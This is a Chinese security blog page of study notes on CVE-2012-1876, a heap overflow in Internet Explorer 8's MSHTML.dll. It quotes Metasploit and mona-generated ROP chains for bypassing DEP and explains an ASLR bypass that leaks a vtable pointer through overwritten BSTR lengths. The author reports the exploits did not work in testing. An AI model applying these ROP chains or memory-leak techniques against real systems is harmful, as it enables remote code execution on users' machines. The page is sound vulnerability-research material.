<!DOCTYPE html>
<html>


    <head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>漏洞战争-cve-2012-1876</title>
<meta name="description" content="A blog about programming and network security">

<link rel="profile" href="https://gmpg.org/xfn/11" />
<link rel="stylesheet" href="/css/my_code.css">
<!-- below font-awesome.css can not be replaced by local file,error will occur -->
<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
<link rel="stylesheet" href="/css/highlightjs.piperita.css">

<!-- Favicons generated at https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="/favicons/manifest.json">
<!-- <link rel="shortcut icon" href="/favicons/favicon.ico"> -->
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
<meta name="msapplication-config" content="/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">

<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
<script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script>






</head>


    <body>

    <nav id="my-menu">
  <div>
    <p>quanyechavshuo</p>

    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <!--https://fontawesome.io/icons/ -->
    <br>
    <center>
    <font color="red" align="center"><i class="fa fa-link" aria-hidden="true"></i><a href="../../../../../bookmarks.html"><font color="red"> link</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html" target="_top"><font color="red"> book</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-caret-square-o-right" aria-hidden="true"></i><a href="../../../../../mv.html" target="_top"><font color="red"> movie</font></a></font>
    </center>
    <p class="links">
  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
</p>

  </div>
</nav>
<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>



    <div class="page-content">
      <div class="wrap">
      

<div class="container-fluid single">
  <div class="row">

    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
      

      <h1 class="header" itemprop="name">漏洞战争-cve-2012-1876</h1>

      <div class="author">
        <small><i>
          
          on <span itemprop="datePublished" content="2014-08-28">December 5, 2016</span>
           under 二进制
        </i></small>
      </div>

      <div class="read-time">
        <small>
          3 minute read
        </small>
      </div>

      <div class="content-panel content">

        

        <span itemprop="articleBody"><h3 id="about">About</h3>

<div class="highlighter-rouge"><pre class="highlight"><code>目标:Internet Explorer 8
目的:利用js绕过dep+aslr
漏洞源:MSHTML.dll
漏洞情况:
	Microsoft Internet Explorer 6到9和10 Consumer Preview没有正确处理内存中的对象,这允许远程攻击者通过尝试访问
	不存在的对象来执行任意代码,导致基于堆的缓冲区溢出,也称为"Col元素远程代码执行漏洞"
</code></pre>
</div>

<h3 id="分析">分析</h3>

<div class="highlighter-rouge"><pre class="highlight"><code>书中在绕过dep的+aslr的时候有两次溢出,第一次是为了得到mshtml.dll的基址以便构造rop gadgets绕过dep,但是在msf的exp中
没有这个步骤,msf直接使用msvcrt.dll或jre.dll来绕过dep,尝试在实际环境中用mona获取msvcrt.dll的rop gadgets,发现获得
的rop gadgets结果与msf中的并不一致,如下:
msf的exp中的rop:

	  when :msvcrt
        print_status("Using msvcrt ROP")
        exec_size = code.length
        rop =
          [
            0x77c4ec01, # retn
            0x77c4ec00, # pop ebp; retn
            0x77c15ed5, # xchg eax,esp; retn (pivot)
            0x77c4e392, # pop eax; retn
            0x77c11120, # &lt;- *&amp;VirtualProtect()
            0x77c2e493, # mov eax, dword ptr ds:[eax]; pop ebp; retn
            junk,
            0x77c2dd6c,
            0x77c4ec00, # pop ebp; retn
            0x77c35459, # ptr to 'push esp; ret'
            0x77c47705, # pop ebx; retn
            exec_size,  # ebx
            0x77c3ea01, # pop ecx; retn
            0x77c5d000, # W pointer (lpOldProtect) (-&gt; ecx)
            0x77c46100, # pop edi; retn
            0x77c46101, # rop nop (-&gt; edi)
            0x77c4d680, # pop edx; retn
            0x00000040, # newProtect (0x40) (-&gt; edx)
            0x77c4e392, # pop eax; retn
            nop,        # nops (-&gt; eax)
            0x77c12df9  # pushad; retn
          ].pack("V*")
      when :jre
        print_status("Using JRE ROP")
        exec_size = code.length
        rop =
          [
            0x7c346c0b, # retn
            0x7c36f970, # pop ebp; retn
            0x7c348b05, # xchg eax,esp; retn (pivot)
            0x7c36f970, # pop ebp; retn [MSVCR71.dll]
            0x7c36f970, # skip 4 bytes [MSVCR71.dll]
            0x7c34373a, # pop ebx ; retn [MSVCR71.dll]
            exec_size,  # ebx
            0x7c3444d0, # pop edx ; retn [MSVCR71.dll]
            0x00000040, # 0x00000040-&gt; edx
            0x7c361829, # pop ecx ; retn [MSVCR71.dll]
            0x7c38f036, # &amp;Writable location [MSVCR71.dll]
            0x7c342766, # pop edi ; retn [MSVCR71.dll]
            0x7c346c0b, # retn (rop nop) [MSVCR71.dll]
            0x7c350564, # pop esi ; retn [MSVCR71.dll]
            0x7c3415a2, # jmp [eax] [MSVCR71.dll]
            0x7c3766ff, # pop eax ; retn [MSVCR71.dll]
            0x7c37a151, # ptr to &amp;VirtualProtect() - 0x0ef [IAT msvcr71.dll]
            0x7c378c81, # pushad # add al,0ef ; retn [MSVCR71.dll]
            0x7c345c30  # ptr to 'push esp; ret ' [MSVCR71.dll]
          ].pack("V*")

虚拟机中(win7x64+immunity debugger32+python32+mona)用如下命令获取的rop gadgets:
command:!mona rop -m msvcrt.dll -cp nonull
rop gadgets:

		 def create_rop_chain()

		   # rop chain generated with mona.py - www.corelan.be
		   rop_gadgets =
		   [
			 0x7788ea09,  # POP EBP # RETN [msvcrt.dll]
			 0x7788ea09,  # skip 4 bytes [msvcrt.dll]
			 0x778afd36,  # POP EAX # RETN [msvcrt.dll]
			 0x3974ffff,  # put delta into eax (-&gt; put 0x00000001 into ebx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7788d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll]
			 0x7785f5d4,  # POP EAX # RETN [msvcrt.dll]
			 0x39750ffe,  # put delta into eax (-&gt; put 0x00001000 into edx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7786ad98,  # XCHG EAX,EDX # RETN [msvcrt.dll]
			 0x7785aeba,  # POP EAX # RETN [msvcrt.dll]
			 0xa2a7fcd6,  # put delta into eax (-&gt; put 0x00000040 into ecx)
			 0x778b950f,  # ADD EAX,5D58036A # RETN [msvcrt.dll]
			 0x7784b984,  # XCHG EAX,ECX # ADD AL,5D # RETN 0x04 [msvcrt.dll]
			 0x77850a31,  # POP EDI # RETN [msvcrt.dll]
			 0x41414141,  # Filler (RETN offset compensation)
			 0x77829f09,  # RETN (ROP NOP) [msvcrt.dll]
			 0x7787c433,  # POP ESI # RETN [msvcrt.dll]
			 0x7782b7bd,  # JMP [EAX] [msvcrt.dll]
			 0x77851a3a,  # POP EAX # RETN [msvcrt.dll]
			 0x778211bc,  # ptr to &amp;VirtualAlloc() [IAT msvcrt.dll]
			 0x77885cfc,  # PUSHAD # RETN [msvcrt.dll]
			 0x778530ad,  # ptr to 'call esp' [msvcrt.dll]
		   ].flatten.pack("V*")

		   return rop_gadgets

		 end
发现rop gadgets的地址并不一样,在msf中测试msf的exp是否有效,结果win7x64中的iex32并没有成功溢出,而是停止工作了,这
里查看系统是否开了dep,发现是开了的,难道msf中的exp不支持绕过dep?为了验证,将win7x64中dep关闭(要重启),重新测试msf
的exp,发现还是无法成功溢出,ie和之前一样出现异常而停止工作,后来看到书中配套资料中的rb文件是和msf中的rb文件不一样
的,msf中的rb文件应该是依靠没有启用aslr模块(msvcrt或jre)来一次溢出利用的,不过msf中的rb在本机测试并没有用,后来重
新测试书中配套资料中的rb文件,该rb文件是二次溢出来利用漏洞,第一次溢出找到模块基址,第二次溢出控制代码执行流程,但
是在本机测试依然失败,尝试换成x32系统,仍然失败,后来觉得可能是系统已经安装了补丁,但是systeminfo | find
"2699988"没有找到,不知为何会出现这种情况,尝试用脚本将系统补丁全部删除,再重新尝试,在实验的win7x64位系统上仍然失
败,或许是书中配套资料中的rb文件也不是可以利用的,无奈放下这个问题,这里只学习书中提到的相关技术与这个漏洞的分析.

技术点

[+] cmd中用gflags.exe对ie进程开启hpa选项后,用ie打开poc.html,ie崩溃但是却没有被windbg拦截到异常,原因是ie衍生出子
进程,而windbg默认情况下是不支持子进程调试的,下面命令可开启子进程调试:
.childdbg 1

[+] 书中某一调试步骤中ln 69a69868命令得到的结果为:
(69a69868) mshtml!CTableLayout::`vftable` | (69a699a8) mshtml!CTableLayoutBlock::`vftable`
其中的关键字vftable是指"虚表",虚表与类与虚表指针与对象的关系可参考下面链接:
http://blog.csdn.net/w616589292/article/details/51250285
http://blog.csdn.net/coolshine1234/article/details/17390143
http://blog.csdn.net/luxiaoyu_sdc/article/details/6145403
a)虚表对应类,虚表指针对应对象
b)对象的头4个字节存放的是虚表指针,虚表中每4个字节存放一个虚函数地址,各个虚函数地址构成一张"表"(这里指32位系统下
为4字节,64位系统应该是8字节)
如果[addr]=69a69868,由于69a69868处是虚表,也即69a69868是虚表指针的值,说明addr是对象所在的内存地址,书中参数1指的
是这里的addr,也即书中的[ebp+8]==poi(ebp+8)=065b9ea8

[+] 通过覆盖BSTR头部长度值得到模块基址.可参考如下链接:
http://www.cnblogs.com/Danny-Wei/p/3766337.html
BSTR是一种字符串数据类型,一种Pascal-Style字符串(明确标示字符串长度)和C-Style字符串(以\0结尾)的混合物,主要用于
COM,交互功能等,是一种复合的数据类型,由一个长度前缀,数据字符串和一个终止符组成,如下图所示:

header|               |terminator
4bytes|string(unicode)|00 00

通过修改header的内容修改BSTR的长度,使得BSTR可以访问可以访问原始界限以外的内存,由此可获得相关模块的基址以构造rop
链绕过aslr,具体如下:
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------

首先在内存中连续创建一定数量且大小相同的BSTR,它们在内存中布局如上所示,然后释放一个BSTR并申请一个相同大小的
object(对象),申请的object很可能会被分配到刚刚释放的BSTR所在内存空间上,变成下面:
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|object|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
此时可修改object前面一个BSTR的header内容,使该BSTR可以访问到object的虚表指针(在object的开关4字节),最终可计算出相
关模块的内存基址.有时候不能修改4字节的BSTR的header内容而只能修改1-2字节时,可以通过修改BSTR的终止符,从而将string
与后面的object连接起来,随后访问修改后的BSTR,也可以访问到object并计算相关模块基址

[+] 上面一个技术点中的通过得到object对象的虚表指针计算模块基址的方法为:
eg.mshtml.dll!CButtonLayout::`vftable`表示mshtml模块中的CButtonLayout类的虚函数表
如果某内存地址为addr处存放的是mshtml模块的CButtonLayout类的虚函数表,则addr是CButtonLayout对象的虚表指针的值,而
aslr的功能是让mshtml模块在内存中加载的基址不同,但addr在mshtml模块中的偏移是固定的,这个偏移量可在动态调试时容易
得到,假设addr在mshtml模块中的偏移量为x,那么由addr计算出mshtml模块为:mshtmlBase_=addr-x
也即对应书中对应的:
mshtmlbase=leak_addr-Number(0x001582b8)

这个技术点是典型的通过内存信息泄露(CButtonLayout对象的虚表指针泄露)获取有关内存布局,目标进程相关的状态信息的方
法,也可以通过静态变量的指针值等获取dll基址

[+] 绕过dep+aslr的一种思路
通过2次溢出,第一次溢出得到模块基址,第二次溢出控制代码执行eip

[+] 书中的构造堆布局以便将mshtml.dll基址泄露的js代码为:

</code></pre>
</div>
</span>

        


        
        <div class="tags">
          <small>
          <i class="fa fa-tags"></i>
            bin, js, ie
          </small>
        </div>
        

      </div>

      
      <div class="content-panel feedback">
        I <i class="fa fa-heart"></i> feedback.<br />
        Let me know what you think of this article on twitter <a href="https://www.twitter.com/quanyechavshuo">@quanyechavshuo</a>!
      </div>
      


      



      
<!-- 多说评论框 start -->
<div class="ds-thread" data-thread-key="/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/漏洞战争-cve-2012-1876" data-title="" data-url="https://3xp10it.github.io//%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/"></div>
<!-- 多说评论框 end -->
<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"3xp10it"};
	(function() {
		var ds = document.createElement('script');
		ds.type = 'text/javascript';ds.async = true;
		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
		ds.charset = 'UTF-8';
		(document.getElementsByTagName('head')[0] 
		 || document.getElementsByTagName('body')[0]).appendChild(ds);
	})();
	</script>
<!-- 多说公共JS代码 end -->

<!-- 个人增加织网背景效果 -->
<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
      


      

    </div>

  </div>

</div>





      </div>
    </div>

    <div class="footer clearfix">
  <div class="col-md-12">
		  <!--for better experience please install font 文泉驿等宽正黑-->
Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
	<SCRIPT language=javascript> 
	<!-- 
	function show_date_time(){ 
		window.setTimeout("show_date_time()", 1000); 
		BirthDay=new Date("3/7/2016 20:00:00");
		today=new Date(); 
		timeold=(today.getTime() - BirthDay.getTime()); 
		sectimeold=timeold/1000 
		secondsold=Math.floor(sectimeold); 
		msPerDay=24*60*60*1000 
		e_daysold=timeold/msPerDay 
		daysold=Math.floor(e_daysold); 
		e_hrsold=(e_daysold-daysold)*24; 
		hrsold=Math.floor(e_hrsold); 
		e_minsold=(e_hrsold-hrsold)*60; 
		minsold=Math.floor((e_hrsold-hrsold)*60); 
		seconds=Math.floor((e_minsold-minsold)*60); 
		//times = document.getElementById("times");
		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
	} 
	show_date_time(); 
	//--> 
	</SCRIPT>
  </div>
</div>

<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">papers</font></a></div>
<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
<div class="my-archive"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
<div class="my-categories"><i class="fa fa-tags" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">categories</font></a></div>


<script src="/js/jquery-1.11.0.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/jquery.mmenu.min.all.js"></script>
<script src="/js/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
   $(document).ready(function() {
      $("#my-menu").mmenu().on( "closed.mm", function() {
            $(".menu-button").show();
         });
      $(".menu-button").click(function() {
        $(".menu-button").hide();
        $("#my-menu").trigger("open.mm");
      });
   });
</script>





<script type="text/javascript"> 
$youziku.load("h1,h2,h3,h4,h5,h6,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
$youziku.draw(); 
</script>


    </body>
</html>
